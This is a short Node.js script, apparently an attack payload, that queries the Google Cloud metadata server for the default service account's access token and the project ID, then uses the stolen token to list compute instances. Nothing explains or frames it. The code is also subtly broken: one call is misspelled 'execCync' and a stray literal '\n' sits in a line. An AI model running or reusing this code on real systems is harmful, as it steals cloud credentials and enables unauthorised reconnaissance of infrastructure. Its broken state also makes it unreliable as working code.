const { execSync } = require('child_process');
try {
  const tokenStr = execCync('curl -s -X GET -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token').toString();
  const token = JSON.parse(tokenStr).access_token;
  const project = execSync('curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id').toString().trim();
  const iamCmd = `curl -s -H "Authorization: Bearer ${token}" https://compute.googleapis.com/compute/v1/projects/${project}/zones/asia-east1-a/instances`;
  console.log(execSync(iamCmd).toString())\n} catch(e) { console.log(e.message); }